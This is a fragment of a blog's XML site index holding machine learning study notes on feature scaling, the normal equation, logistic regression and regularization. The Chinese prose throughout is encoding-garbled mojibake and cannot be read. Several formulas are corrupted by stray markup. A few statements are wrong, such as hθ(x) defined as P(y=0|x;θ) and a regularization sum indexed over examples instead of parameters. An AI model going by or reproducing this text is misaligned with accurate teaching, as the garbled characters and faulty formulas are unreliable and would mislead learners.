<p>å¦‚æœä½ æƒ³é¢„æµ‹æˆ¿ä»·ï¼Œç°åœ¨æœ‰ä¸¤ä¸ªå˜é‡ x1 å’Œ x2 æ¥ä½œä¸ºç‰¹å¾ï¼Œå…¶ä¸­ x1 ä¸ºæˆ¿å­çš„å¤§å°ï¼ŒèŒƒå›´åœ¨ 0 åˆ° 2000ï¼Œx2 ä¸ºæˆ¿å­ä¸­å§å®¤çš„æ•°ç›®ï¼ŒèŒƒå›´åœ¨ 0 åˆ° 5ï¼Œé‚£ä¹ˆç”»å‡ºè¿™ä¸ªä»£ä»·å‡½æ•°çš„è½®å»“å›¾å°±æ˜¯è¿™ä¸ªæ ·å­ï¼Œä¸€ä¸ªæ‰æ‰çš„æ¤­åœ†å½¢ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031180027.png" alt=""></p>
<p>å¯¹è¿™ä¸ªå‡½æ•°è¿›è¡Œæ¢¯åº¦ä¸‹é™ï¼Œå°±æ˜¯é€”ä¸­è“çº¿çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè·¯ç¨‹å¾ˆé•¿å¾ˆæ›²æŠ˜ï¼Œè¿™æ ·æˆ‘ä»¬è¿›è¡Œæ¢¯åº¦ä¸‹é™æ‰€èŠ±è´¹çš„æ—¶é—´å°±ä¼šå¾ˆé•¿ã€‚</p>
<p>ä¸ºäº†ä½¿ç‰¹å¾å€¼åœ¨ä¸€ä¸ªç›¸ä¼¼çš„èŒƒå›´å†…å˜åŒ–ï¼ˆæ¯”å¦‚-1åˆ°+1ä¹‹é—´ï¼‰ï¼Œå¯ä»¥å°†å˜é‡è¿›è¡Œç‰¹å¾æ”¾ç¼©ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031180132.png" alt=""></p>
<p>ä½†æ˜¯åˆå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œä½ ä¼šå‘ç°ï¼Œç°åœ¨ç»è¿‡å¤„ç†ä¹‹åçš„æ•°æ®å…¨æ˜¯æ­£å€¼ï¼Œä¸åˆ†æ•£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦ç”¨ç¨å¾®å¤æ‚ä¸€ç‚¹çš„æ–¹æ³•è¿›è¡Œç‰¹å¾ç¼©æ”¾ã€‚ç”¨**å‡å€¼å½’ä¸€åŒ–ï¼ˆMean normalizationï¼‰**çš„æ–¹æ³•å¤„ç†æ•°æ®ï¼š<br>
$$<br>
x_n = \frac{x_n - Î¼_n}{s_n}<br>
$$<br>
å…¶ä¸­ Î¼n ä¸ºå¹³å‡å€¼ï¼ŒSn ä¸ºæ ‡å‡†å·®ï¼Œä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªå˜é‡æœ€å¤§å€¼ä¸æœ€å°å€¼çš„å·®ã€‚ç°åœ¨ä½ å°±ä¼šå‘ç°ï¼Œæ•°æ®æ—¢æœ‰æ­£å€¼ä¹Ÿæœ‰è´Ÿå€¼ï¼Œåˆ†æ•£åœ¨-1 åˆ° 1 è¿™ä¸ªåŒºé—´ï¼Œè¿›è¡Œæ¢¯åº¦ä¸‹é™å°±ä¼šå¾ˆå¿«ã€‚</p>
<h4 id="è¿­ä»£çš„æœ‰æ•ˆæ€§">è¿­ä»£çš„æœ‰æ•ˆæ€§</h4>
<p>æˆ‘ä»¬çŸ¥é“æ¢¯åº¦ä¸‹é™ç®—æ³•æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ç¡®å®šè¿™ä¸ªé€’å½’çš„æ–¹å‘æ˜¯æ­£ç¡®çš„å‘¢ï¼Ÿè§†é¢‘ä¸­ç»™å‡ºäº†ä¸¤ç§æ–¹æ³•ã€‚</p>
<h5 id="Debugging-gradient-descent">Debugging gradient descent</h5>
<p>ä»¥Xè½´ä¸ºè¿­ä»£æ¬¡æ•°ï¼ŒYè½´ä¸ºæ¯æ¬¡è¿­ä»£çš„ä»£ä»·å‡½æ•°å€¼æ¥ä½œå›¾ï¼Œå¦‚æœå›¾åƒæ˜¯ä¸€ä¸ªä¸‹é™çš„è¿‡ç¨‹ï¼Œå¹¶åœ¨æœ€åè¶‹äºå¹³ç¼“ï¼Œé‚£ä¹ˆè¿™ç§è¿­ä»£æ˜¯æœ‰æ•ˆçš„ã€‚å¦‚æœå›¾åƒæ˜¯ä¸€ä¸ªä¸Šå‡çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆåº”è¯¥è¯•ç€å‡å°Î±çš„å€¼ã€‚</p>
<h5 id="Automatic-convergence-test">Automatic convergence test</h5>
<p>é€šè¿‡è®¾å®šä¸€ä¸ªé˜ˆå€¼Îµï¼ˆæ¯”å¦‚Îµ=10<sup>-3</sup>ï¼‰ï¼Œå¦‚æœæ¯æ¬¡è¿­ä»£ä¹‹åï¼Œä»£ä»·å‡½æ•°çš„å‡å°‘é‡å°äºé˜ˆå€¼Îµï¼Œé‚£ä¹ˆå°±è®¤å®šè¿­ä»£æ˜¯æœ‰æ•ˆçš„ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¹¶ä¸å¤ªå®¹æ˜“å»ç¡®å®šé˜ˆå€¼Îµã€‚</p>
<h4 id="å¤šé¡¹å¼å›å½’æ–¹ç¨‹">å¤šé¡¹å¼å›å½’æ–¹ç¨‹</h4>
<p>å¦‚æœå‡è®¾å‡½æ•°ä¸èƒ½å¾ˆå¥½åœ°æ‹Ÿåˆæ•°æ®ï¼Œåˆ™å®ƒä¸ä¸€å®šå¿…é¡»æ˜¯ä¸€ä¸ªçº¿æ€§çš„ï¼ˆç›´çº¿ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å…¶è®¾ä¸ºäºŒæ¬¡ï¼Œä¸‰æ¬¡æˆ–å¹³æ–¹æ ¹å‡½æ•°ï¼ˆæˆ–ä»»ä½•å…¶ä»–å½¢å¼ï¼‰æ¥æ›´æ”¹å‡è®¾å‡½æ•°çš„è¡Œä¸ºã€‚æ¯”å¦‚è¯´æ ¹æ®é¢ç§¯çš„å¤§å°æ¥é¢„æµ‹æˆ¿ä»·ï¼Œå¦‚æœç»™å®šçš„æ•°æ®é›†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191101135532.png" alt=""></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠå‡è®¾å‡½æ•°å˜ä¸ºä¸‰æ¬¡å‡½æ•°æˆ–å¹³æ–¹æ ¹å‡½æ•°ï¼ˆå› ä¸ºäºŒæ¬¡å‡½æ•°åœ¨æœ€å¤§å€¼ä¹‹åä¼šä¸‹é™ï¼Œè¿™ä¸ç¬¦åˆå®é™…æƒ…å†µï¼‰,å³ï¼š<br>
$$<br>
h_\theta(x) = \theta_0 + \theta_1 x_1 + \theta_2 x_1^2 + \theta_3 x_1^3<br>
$$<br>
æˆ–è€…ï¼š<br>
$$<br>
h_\theta (x) = \theta_0 + \theta_1 x_1 + \theta_2 \sqrt {x_1}<br>
$$</p>
<blockquote>
<p>è¿™ä¸ªæ—¶å€™ç‰¹å¾æ”¾ç¼©å°±æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p>
</blockquote>
<h4 id="æ­£è§„æ–¹ç¨‹ï¼ˆNormal-Equationï¼‰">æ­£è§„æ–¹ç¨‹ï¼ˆNormal Equationï¼‰</h4>
<p>â€œæ­£è§„æ–¹ç¨‹â€æ˜¯ä¸€ç§æ— éœ€è¿­ä»£å³å¯æ‰¾åˆ°æœ€ä½³Î¸çš„æ–¹æ³•ï¼Œå…¬å¼å¦‚ä¸‹ï¼š<br>
$$<br>
\theta = (X^T X)^{-1} X^T y<br>
$$</p>
<blockquote>
<p>æ— éœ€å¯¹æ­£è§„æ–¹ç¨‹è¿›è¡Œç‰¹å¾ç¼©æ”¾ã€‚</p>
</blockquote>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œè¿˜æ˜¯æ±‚æˆ¿ä»·ï¼Œç°åœ¨æœ‰ 4 ç»„è®­ç»ƒé›†ï¼Œå¦‚ä¸‹è¡¨ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191101141117.png" alt=""></p>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒçŸ©é˜µXä¸ºï¼š<br>
$$<br>
\begin{align*}X = \begin{bmatrix}1 &amp; 2014 &amp; 5 &amp; 1 &amp; 45 \newline 1 &amp; 1416 &amp; 3 &amp; 2 &amp; 40  \newline 1 &amp; 1534 &amp; 3 &amp; 2 &amp; 40 \newline 1 &amp; 852 &amp; 2 &amp; 1 &amp;36 \end{bmatrix} \end{align*}<br>
$$<br>
å‘é‡yä¸ºï¼š<br>
$$<br>
\begin{align*} y = \begin{bmatrix} 460 \newline 232 \newline 315 \newline 178 \end{bmatrix} \end{align*}<br>
$$<br>
è¿™æ ·é€šè¿‡æ­£è§„æ–¹ç¨‹å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°æ±‚å‡ºå‚æ•° Î¸ï¼ˆä¸€å®šè¦æ³¨æ„ï¼Œè¿™é‡Œçš„å‚æ•° Î¸ æ˜¯ä¸€ä¸ªå‘é‡ï¼‰ã€‚</p>
<p>æ—¢ç„¶æ±‚å‚æ•° Î¸ æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªä¸º<strong>æ¢¯åº¦ä¸‹é™æ³•</strong>ï¼Œä¸€ä¸ªä¸º<strong>æ­£è§„æ–¹ç¨‹</strong>ï¼Œé‚£ä¹ˆä»–ä¿©ä¹‹é—´ä¸€å®šä¼šæœ‰ä¼˜ç¼ºç‚¹ï¼Œä¸‹è¡¨å°±æ˜¯è¿™ä¸¤ç§æ–¹æ³•çš„ä¼˜ç¼ºç‚¹çš„å¯¹æ¯”ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left">æ¢¯åº¦ä¸‹é™</th>
<th style="text-align:left">æ­£è§„æ–¹ç¨‹</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">éœ€è¦é€‰æ‹©å­¦ä¹ é€Ÿç‡Î±</td>
<td style="text-align:left">ä¸éœ€è¦é€‰æ‹©å­¦ä¹ é€Ÿç‡</td>
</tr>
<tr>
<td style="text-align:left">éœ€è¦è¿­ä»£</td>
<td style="text-align:left">ä¸éœ€è¦è¿­ä»£</td>
</tr>
<tr>
<td style="text-align:left">æ—¶é—´å¤æ‚åº¦O (kn<sup>2</sup>)</td>
<td style="text-align:left">O (n<sup>3</sup>), éœ€è¦è®¡ç®—X<sup>T</sup>Xçš„é€†çŸ©é˜µ</td>
</tr>
<tr>
<td style="text-align:left">å½“ç‰¹å¾å€¼å¾ˆå¤šçš„æ—¶å€™ï¼Œæ•ˆç‡ä¹Ÿå¾ˆé«˜</td>
<td style="text-align:left">å½“ç‰¹å¾å€¼å¾ˆå¤šçš„æ—¶å€™ï¼Œæ•ˆç‡å¾ˆä½ï¼ˆè¦æ±‚é€†çŸ©é˜µï¼‰</td>
</tr>
</tbody>
</table>
<p>æ—¢ç„¶è¦æ±‚é€†çŸ©é˜µï¼Œé‚£ä¹ˆå°±è‚¯å®šä¼šå‡ºç°X<sup>T</sup>Xä¸å¯é€†çš„æ—¶å€™ã€‚</p>
<p><strong>ç¬¬ä¸€ç§æƒ…å†µï¼š</strong> å‡ºç°äº†ä¸¤ä¸ªç›¸ä¼¼çš„ç‰¹å¾ï¼Œè¿™ä¸ªä¸¤ä¸ªç‰¹å¾å¯ä»¥ç”¨ä¸€ä¸ªçº¿æ€§å…³ç³»è¿›è¡Œè¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œç±³å’Œè‹±å°ºï¼Œè¿™ä¸¤ä¸ªéƒ½æ˜¯ç”¨æ¥æè¿°é•¿åº¦çš„å•ä½ï¼Œä¸”ä»–ä»¬ä¹‹é—´å¯ä»¥è¿›è¡Œç›¸äº’è½¬åŒ–ï¼Œå¦‚æœç‰¹å¾å€¼åŒæ—¶å‡ºç°ä»–ä»¬ä¸¤ä¸ªï¼Œå°±ä¼šå‡ºç°çŸ©é˜µä¸å¯é€†çš„æƒ…å†µã€‚</p>
<p><strong>è§£å†³æ–¹æ³•</strong>ï¼šå»æ‰ä»»æ„ä¸€ä¸ªå³å¯ã€‚</p>
<p><strong>ç¬¬äºŒç§æƒ…å†µ</strong>ï¼šç‰¹å¾å€¼çš„æ•°é‡ç‰¹åˆ«å¤šï¼Œä½†æ˜¯æ•°æ®é›†çš„æ•°é‡ç‰¹åˆ«å°‘ã€‚</p>
<p><strong>è§£å†³æ–¹æ³•</strong>ï¼šå¢åŠ æ•°æ®é›†æˆ–å‡å°‘ç‰¹å¾å€¼ã€‚</p>
]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
        <category>åŸºç¡€å…¥é—¨</category>
      </categories>
      <tags>
        <tag>æœºå™¨å­¦ä¹ </tag>
        <tag>çº¿æ€§å›å½’</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-Week3</title>
    <url>/Machine_learning/basic_learning/3.Machine-Learning-Week3/</url>
    <content><![CDATA[<blockquote>
<p>è¿™ä¸€ç¯‡ä¸»è¦æ€»ç»“é€»è¾‘å›å½’ç›¸å…³çŸ¥è¯†ç‚¹</p>
</blockquote>
<h1 id="Machine-Learning-Week3">Machine Learning Week3</h1>
<h2 id="0x01-å‡è®¾è¡¨ç¤º-Hypothesis-Representation">0x01 å‡è®¾è¡¨ç¤º(Hypothesis Representation)</h2>
<p>é€»è¾‘å›å½’ç®—æ³•çš„å‡è®¾å‡½æ•° hÎ¸(x) ç”±ä»¥ä¸‹è¡¨è¾¾å¼ç»„æˆï¼š<br>
$$<br>
\begin{align*}&amp; h_\theta (x) = g ( \theta^T x ) \newline \newline&amp; z = \theta^T x \newline&amp; g(z) = \dfrac{1}{1 + e^{-z}}\end{align*}<br>
$$<br>
å…¶ä¸­g(z) ç§°ä¸º<strong>é€»è¾‘å‡½æ•°ï¼ˆLogistic Functionï¼‰</strong>ï¼Œåˆç§°ä¸º <strong>Sigmoid Function</strong>ã€‚</p>
<p>è¯¥å‡½æ•°çš„å›¾åƒä¸ºï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409103736.png" alt=""></p>
<p>hÎ¸(x) çš„ä½œç”¨æ˜¯ï¼Œå¯¹äºç»™å®šçš„è¾“å…¥å˜é‡ï¼Œæ ¹æ®é€‰æ‹©çš„å‚æ•°è®¡ç®—è¾“å‡ºå˜é‡=1çš„å¯èƒ½æ€§ï¼Œå³hÎ¸(x) = P(y=0|x;Î¸) ï¼Œä¾‹å¦‚ï¼Œå¦‚æœå¯¹äºç»™å®šçš„xï¼Œé€šè¿‡å·²ç»ç¡®å®šçš„å‚æ•°è®¡ç®—å¾—å‡ºhÎ¸(x) = 0.7ï¼Œåˆ™è¡¨ç¤ºæœ‰70%çš„å‡ ç‡yä¸ºæ­£å‘ç±»ï¼Œç›¸åº”åœ°ä¸ºè´Ÿå‘ç±»çš„å‡ ç‡ä¸º1-0.7=0.3ã€‚</p>
<h2 id="0x02-åˆ¤å®šè¾¹ç•Œ-Decision-Boundary">0x02 åˆ¤å®šè¾¹ç•Œ(Decision Boundary)</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409104311.png" alt=""></p>
<p>åœ¨é€»è¾‘å›å½’ä¸­ï¼Œæˆ‘ä»¬é¢„æµ‹ï¼š</p>
<p>å½“ hÎ¸(x) &gt;= 0.5æ—¶ï¼Œé¢„æµ‹y=1;</p>
<p>å½“ hÎ¸(x) &lt; 0.5æ—¶ï¼Œé¢„æµ‹y=0;</p>
<p>æ ¹æ®Så½¢å‡½æ•°å›¾åƒï¼Œå½“</p>
<p>z = 0æ—¶ï¼Œg(z) = 0.5;</p>
<p>z &gt; 0æ—¶ï¼Œg(z) &gt; 0.5;</p>
<p>z &lt; 0æ—¶ï¼Œg(z) &lt; 0.5;</p>
<p>åˆz = Î¸<sup>T</sup>xï¼Œå³ Î¸<sup>T</sup>x &gt;= 0æ—¶ï¼Œé¢„æµ‹y=1ï¼Œ Î¸<sup>T</sup>x &lt; 0æ—¶ï¼Œé¢„æµ‹y=0</p>
<p>ç°åœ¨å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¨¡å‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409110112.png" alt=""></p>
<p>å¹¶ä¸”å‚æ•°Î¸æ˜¯å‘é‡[-3 1 1]ã€‚ åˆ™å½“-3 + x1 + x2 &gt;= 0ï¼Œå³x1 + x2 &gt;= 3æ—¶ï¼Œæ¨¡å‹å°†é¢„æµ‹ y = 1 ã€‚ æˆ‘ä»¬å¯ä»¥ç»˜åˆ¶ç›´çº¿x1 + x2 = 3ï¼Œè¿™æ¡çº¿ä¾¿æ˜¯æˆ‘ä»¬æ¨¡å‹çš„åˆ†ç•Œçº¿ï¼Œå°†é¢„æµ‹ä¸º1çš„åŒºåŸŸå’Œé¢„æµ‹ä¸º 0çš„åŒºåŸŸåˆ†éš”å¼€ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œz = Î¸<sup>T</sup>xåœ¨å‡ ä½•è§’åº¦ä¸­å°±æ˜¯åˆ¤å®šè¾¹ç•Œçš„å‡½æ•°ã€‚å†³ç­–è¾¹ç•Œåªä¸å‚æ•° Î¸ æœ‰å…³ã€‚</p>
<h2 id="0x03-ä»£ä»·å‡½æ•°-Cost-Function">0x03 ä»£ä»·å‡½æ•°(Cost Function)</h2>
<p>å…¬å¼è¡¨ç¤ºï¼š<br>
$$<br>
\begin{align*}&amp; J(\theta) = \dfrac{1}{m} \sum_{i=1}^m \mathrm{Cost}(h_\theta(x<sup>{(i)}),y</sup>{(i)}) \newline &amp; \mathrm{Cost}(h_\theta(x),y) = -\log(h_\theta(x)) ; &amp; \text{if y = 1} \newline &amp; \mathrm{Cost}(h_\theta(x),y) = -\log(1-h_\theta(x)) ; &amp; \text{if y = 0}\end{align*}<br>
$$<br>
å‡ ä½•æ„ä¹‰ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200409110525.png" alt=""></p>
<p>è¿™æ ·æ„å»ºçš„Cost(hÎ¸(x), y)å‡½æ•°çš„ç‰¹ç‚¹æ˜¯ï¼šå½“å®é™…çš„y =1ä¸” hÎ¸(x) ä¹Ÿä¸º1 æ—¶è¯¯å·®ä¸º 0ï¼Œå½“ y = 1ä½†hÎ¸(x)ä¸ä¸º1æ—¶è¯¯å·®éšç€hÎ¸(x)å˜å°è€Œå˜å¤§ï¼›å½“å®é™…çš„y = 0ä¸”hÎ¸(x)ä¹Ÿä¸º 0 æ—¶ä»£ä»·ä¸º 0ï¼Œå½“y = 0ä½†hÎ¸(x)ä¸ä¸º0æ—¶ï¼Œè¯¯å·®éšç€hÎ¸(x)çš„å˜å¤§è€Œå˜å¤§ã€‚</p>
<p>è¿›ä¸€æ­¥æ•´ç†ä¸€ä¸‹ï¼š<br>
$$<br>
\mathrm{Cost}(h_\theta(x),y) = - y ; \log(h_\theta(x)) - (1 - y) \log(1 - h_\theta(x))<br>
$$<br>
å¸¦å…¥ï¼š<br>
$$<br>
J(\theta) = \dfrac{1}{m} \sum_{i=1}^m - y^{(i)} ; \log(h_\theta(x^{(i)})) - (1 - y^{(i)}) \log(1 - h_\theta(x^{(i)}))<br>
$$<br>
å‘é‡åŒ–ï¼š<br>
$$<br>
\begin{align*} &amp; h = g(X\theta)\newline &amp; J(\theta) = \frac{1}{m} \cdot \left(-y<sup>{T}\log(h)-(1-y)</sup>{T}\log(1-h)\right) \end{align*}<br>
$$</p>
<h2 id="0x04-æ¢¯åº¦ä¸‹é™-Gradient-Descent">0x04 æ¢¯åº¦ä¸‹é™(Gradient Descent)</h2>
<p>æ¢¯åº¦ä¸‹é™çš„ä¸€èˆ¬å½¢å¼ï¼š<br>
$$<br>
\begin{align*}&amp; Repeat ; \lbrace \newline &amp; ; \theta_j := \theta_j - \alpha \dfrac{\partial}{\partial \theta_j}J(\theta) \newline &amp; \rbrace\end{align*}<br>
$$<br>
ä»£å…¥J(Î¸)ï¼š<br>
$$<br>
\begin{align*} &amp; Repeat ; \lbrace \newline &amp; ; \theta_j := \theta_j - \frac{\alpha}{m} \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)}) x_j^{(i)} \newline &amp; \rbrace \end{align*}<br>
$$<br>
å¯ä»¥å‘ç°ï¼Œé€»è¾‘å›å½’çš„æ¢¯åº¦ä¸‹é™å’Œçº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™åœ¨å½¢å¼ä¸Šæ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œä½†æ˜¯å‡è®¾å‡½æ•°hÎ¸(x)å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<p>å‘é‡åŒ–ï¼š<br>
$$<br>
\theta := \theta - \frac{\alpha}{m}X^T(g(X\theta) - \vec y)<br>
$$</p>
<h2 id="0x05-å¤šåˆ†ç±»-Muti-classification">0x05 å¤šåˆ†ç±»(Muti-classification)</h2>
<p>å¤„ç†å¤šåˆ†ç±»é—®é¢˜çš„æœ¬è´¨å°±æ˜¯è½¬åŒ–ä¸ºäºŒåˆ†ç±»é—®é¢˜ï¼Œç°åœ¨å‡è®¾æœ‰ä¸‰ä¸ªç±»åˆ«ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200410110259.png" alt=""></p>
<p>ç”¨ä¸‰è§’å½¢è¡¨ç¤ºy = 1 ï¼Œæ–¹æ¡†è¡¨ç¤ºy = 2ï¼Œå‰å‰è¡¨ç¤ºy = 3 ã€‚æˆ‘ä»¬ä¸‹é¢è¦åšçš„å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªè®­ç»ƒé›†ï¼Œå°†å…¶åˆ†æˆ3ä¸ªäºŒå…ƒåˆ†ç±»é—®é¢˜</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200410110338.png" alt=""></p>
<p>ä¸ºäº†èƒ½å®ç°è¿™æ ·çš„è½¬å˜ï¼Œæˆ‘ä»¬å°†å¤šä¸ªç±»ä¸­çš„ä¸€ä¸ªç±»æ ‡è®°ä¸ºæ­£å‘ç±»ï¼ˆy = 1ï¼‰ï¼Œç„¶åå°†å…¶ä»–æ‰€æœ‰ç±»éƒ½æ ‡è®°ä¸ºè´Ÿå‘ç±»ï¼Œè¿™ä¸ªæ¨¡å‹è®°ä½œh<sub>Î¸</sub><sup>(1)</sup> (x)ã€‚æ¥ç€ï¼Œç±»ä¼¼åœ°ç¬¬æˆ‘ä»¬é€‰æ‹©å¦ä¸€ä¸ªç±»æ ‡è®°ä¸ºæ­£å‘ç±»ï¼ˆy = 2ï¼‰ï¼Œå†å°†å…¶å®ƒç±»éƒ½æ ‡è®°ä¸ºè´Ÿå‘ç±»ï¼Œå°†è¿™ä¸ªæ¨¡å‹è®°ä½œ h<sub>Î¸</sub><sup>(2)</sup> (x)ï¼Œä¾æ­¤ç±»æ¨ã€‚æœ€åï¼Œä¸ºäº†åšå‡ºé¢„æµ‹ï¼Œæˆ‘ä»¬ç»™å‡ºè¾“å…¥ä¸€ä¸ªæ–°çš„xå€¼ï¼Œç”¨è¿™ä¸ªåšé¢„æµ‹ã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯åœ¨æˆ‘ä»¬ä¸‰ä¸ªåˆ†ç±»å™¨é‡Œé¢è¾“å…¥x ï¼Œç„¶åæˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªè®© h<sub>Î¸</sub><sup>(i)</sup> (x)æœ€å¤§çš„iï¼Œå³ï¼š<br>
$$<br>
\arg\max_\theta h_{\theta}^{(i)}<br>
$$</p>
<h2 id="0x06-æ­£åˆ™åŒ–-Regularization">0x06 æ­£åˆ™åŒ–(Regularization)</h2>
<p>æ‰€è°“æ­£åˆ™åŒ–ï¼Œå°±æ˜¯ä¸ºäº†é˜²æ­¢å‡ºç°è¿‡æ‹Ÿåˆè€Œå¯¹æŸäº›Î¸å‚æ•°å¼•å…¥æƒ©ç½šå› å­ï¼Œè¿™æ ·åšçš„è¯ï¼Œæˆ‘ä»¬åœ¨å°è¯•æœ€å°åŒ–ä»£ä»·æ—¶ä¹Ÿéœ€è¦å°†è¿™ä¸ªæƒ©ç½šçº³å…¥è€ƒè™‘ä¸­ï¼Œå¹¶æœ€ç»ˆå¯¼è‡´é€‰æ‹©è¾ƒå°ä¸€äº›çš„Î¸ã€‚</p>
<p>æ¯”å¦‚å›å½’é—®é¢˜ä¸­å¦‚æœæˆ‘ä»¬çš„å‡è®¾å‡½æ•°æ˜¯ï¼š<br>
$$<br>
h_\theta (x) = \theta_0 + \theta_1 x_1 + \theta_2 x_2^2 + \theta_3 x_3^3 + \theta_4 x_4^4<br>
$$<br>
æˆ‘ä»¬æƒ³å¯¹Î¸3å’ŒÎ¸4è®¾ç½®ä¸€ç‚¹æƒ©ç½šï¼Œä¿®æ”¹åçš„ä»£ä»·å‡½æ•°ä¸ºï¼š<br>
$$<br>
min_\theta \frac{1}{2m}[\sum_{i=1}<sup>{m}(h_\theta(x</sup>{(i)})-y<sup>{(i)})</sup>2 + 1000\theta_3^2 + 1000\theta_4^2]<br>
$$<br>
å‡å¦‚æˆ‘ä»¬æœ‰éå¸¸å¤šçš„ç‰¹å¾ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“å…¶ä¸­å“ªäº›ç‰¹å¾æˆ‘ä»¬è¦æƒ©ç½šï¼Œæˆ‘ä»¬å°†å¯¹æ‰€æœ‰çš„ç‰¹å¾è¿›è¡Œæƒ©ç½šï¼Œå¹¶ä¸”è®©ä»£ä»·å‡½æ•°æœ€ä¼˜åŒ–çš„è½¯ä»¶æ¥é€‰æ‹©è¿™äº›æƒ©ç½šçš„ç¨‹åº¦ã€‚è¿™æ ·çš„ç»“æœæ˜¯å¾—åˆ°äº†ä¸€ä¸ªè¾ƒä¸ºç®€å•çš„èƒ½é˜²æ­¢è¿‡æ‹Ÿåˆé—®é¢˜çš„å‡è®¾ï¼š<br>
$$<br>
min_\theta \frac{1}{2m}[\sum_{i=1}<sup>{m}(h_\theta(x</sup>{(i)})-y<sup>{(i)})</sup>2 + \lambda\sum_{i=1}<sup>m\theta_j</sup>2]<br>
$$<br>
å…¶ä¸­Î»åˆç§°ä¸ºæ­£åˆ™åŒ–å‚æ•°ï¼ˆRegularization Parameterï¼‰ã€‚</p>
<h3 id="æ­£åˆ™åŒ–çº¿æ€§å›å½’">æ­£åˆ™åŒ–çº¿æ€§å›å½’</h3>
<p>$$<br>
\begin{align*} &amp; \text{Repeat}\ \lbrace \newline &amp; \ \ \ \ \theta_0 := \theta_0 - \alpha\ \frac{1}{m}\ \sum_{i=1}^m (h_\theta(x^{(i)}) - y<sup>{(i)})x_0</sup>{(i)} \newline &amp; \ \ \ \ \theta_j := \theta_j - \alpha\ \left[ \left( \frac{1}{m}\ \sum_{i=1}^m (h_\theta(x^{(i)}) - y<sup>{(i)})x_j</sup>{(i)} \right) + \frac{\lambda}{m}\theta_j \right] &amp;\ \ \ \ \ \ \ \ \ \ j \in \lbrace 1,2â€¦n\rbrace\newline &amp; \rbrace \end{align*}<br>
$$</p>
<p>æ­£è§„æ–¹ç¨‹æ±‚è§£æ­£åˆ™åŒ–çº¿æ€§å›å½’<br>
$$<br>
\begin{align*}&amp; \theta = \left( X^TX + \lambda \cdot L \right)^{-1} X^Ty \newline&amp; \text{where}\ \ L = \begin{bmatrix} 0 &amp; &amp; &amp; &amp; \newline &amp; 1 &amp; &amp; &amp; \newline &amp; &amp; 1 &amp; &amp; \newline &amp; &amp; &amp; \ddots &amp; \newline &amp; &amp; &amp; &amp; 1 \newline\end{bmatrix}\end{align*}<br>
$$</p>
<h3 id="æ­£åˆ™åŒ–é€»è¾‘å›å½’">æ­£åˆ™åŒ–é€»è¾‘å›å½’</h3>
<p>åŒæ ·å¯¹äºé€»è¾‘å›å½’ï¼Œæˆ‘ä»¬ä¹Ÿç»™ä»£ä»·å‡½æ•°å¢åŠ ä¸€ä¸ªæ­£åˆ™åŒ–çš„è¡¨è¾¾å¼ï¼Œå¾—åˆ°ä»£ä»·å‡½æ•°ï¼š<br>
$$<br>
J(\theta) = -\dfrac{1}{m} \sum_{i=1}^m  [y^{(i)} ; \log(h_\theta(x^{(i)})) + (1 - y^{(i)}) \log(1 - h_\theta(x^{(i)}))] + \frac{\lambda}{2m}\sum_{j=1}^n \theta_j^2<br>
$$</p>
]]></content>
      <categories>
        <category>æœºå™¨å­¦ä¹ </category>
        <category>åŸºç¡€å…¥é—¨</category>
      </categories>
      <tags>
        <tag>æœºå™¨å­¦ä¹ </tag>
        <tag>é€»è¾‘å›å½’</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM</title>
    <url>/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM/</url>
